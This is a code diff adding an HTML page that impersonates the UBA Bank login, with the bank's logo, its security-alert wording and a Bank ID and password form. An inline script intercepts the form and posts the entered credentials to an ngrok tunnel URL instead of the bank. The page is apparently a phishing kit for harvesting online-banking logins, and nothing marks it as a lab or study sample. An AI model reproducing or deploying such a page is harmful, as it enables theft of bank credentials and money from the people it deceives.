@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UBA Bank Login</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://www.ubabank.com/assets/images/uba-logo.png" alt="UBA Bank Logo">
+    </div>
+
+    <h2>UBA Bank Login</h2>
+
+    <form id="loginForm">
+      <div class="form-group">
+        <label for="bankID">Bank ID Number:</label>
+        <input type="text" id="bankID" name="bankID" class="form-control" required>
+      </div>
+
+      <div class="form-group">
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" class="form-control" required>
+      </div>
+
+      <button type="submit" class="btn">Login</button>
+    </form>
+
+    <p class="security-alert">
+      Security Alert! Avoid sharing your card details, internet banking log in and PIN with anyone.
+    </p>
+
+    <p class="new-user">
+      New User? <a href="#">Open Account</a>
+    </p>
+
+    <script>
+      const form = document.getElementById('loginForm');
+
+      form.addEventListener('submit', (event) => {
+        event.preventDefault();
+
+        const bankID = document.getElementById('bankID').value;
+        const password = document.getElementById('password').value;
+
+        const loginData = {
+          bankID,
+          password
+        };
+
+        fetch('https://ngrok-url.com/login', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(loginData)
+        })
+          .then(response => {
+            // Handle the response from the server
+            console.log('Login data sent successfully');
+          })
+          .catch(error => {
+            // Handle any errors that occur during the fetch
+            console.error('Error sending login data:', error);
+          });
+      });
+    </script>
+  </div>
+</body>
+</html>
